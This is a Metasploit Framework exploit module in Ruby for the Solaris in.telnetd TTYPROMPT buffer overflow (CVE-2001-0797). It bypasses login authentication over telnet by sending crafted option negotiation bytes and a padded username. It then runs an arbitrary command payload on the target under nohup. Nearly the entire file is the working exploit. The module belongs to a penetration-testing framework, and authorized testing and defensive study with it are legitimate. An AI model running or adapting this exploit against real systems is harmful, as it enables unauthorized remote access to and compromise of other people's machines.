##
# $Id: ttyprompt.rb 9583 2010-06-22 19:11:05Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Solaris in.telnetd TTYPROMPT Buffer Overflow',
			'Description'    => %q{
				This module uses a buffer overflow in the Solaris 'login'
			application to bypass authentication in the telnet daemon.
			},
			'Author'         => [ 'MC', 'cazz' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9583 $',
			'References'     =>
				[
					[ 'CVE', '2001-0797'],
					[ 'OSVDB', '690'],
					[ 'BID', '5531'],

				],
			'Privileged'     => false,
			'Platform'       => ['unix', 'solaris'],
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					'Space'    => 2000,
					'BadChars' => '',
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl telnet',
						}
				},
			'Targets'        =>
				[
					['Automatic', { }],
				],
			'DisclosureDate' => 'Jan 18 2002',
			'DefaultTarget' => 0))

			register_options(
				[
					Opt::RPORT(23),
					OptString.new('USER', [ true, "The username to use",     "bin" ]),
				], self.class)
	end

	def exploit
		connect

		banner = sock.get_once

		print_status('Setting TTYPROMPT...')

		req =
			"\xff\xfc\x18" +
			"\xff\xfc\x1f" +
			"\xff\xfc\x21" +
			"\xff\xfc\x23" +
			"\xff\xfb\x22" +
			"\xff\xfc\x24" +
			"\xff\xfb\x27" +
			"\xff\xfb\x00" +
			"\xff\xfa\x27\x00" +
			"\x00TTYPROMPT" +
			"\x01" +
			rand_text_alphanumeric(6) +
			"\xff\xf0"

		sock.put(req)
		select(nil,nil,nil,0.25)

		print_status('Sending username...')

		filler = rand_text_alpha(rand(10) + 1)

		req << datastore['USER'] + (" #{filler}" * 65)

		sock.put(req + "\n\n\n")

		select(nil,nil,nil,0.25)
		sock.get_once

		sock.put("nohup " + payload.encoded + " >/dev/null 2>&1\n")

		select(nil,nil,nil,0.25)

		handler
	end

end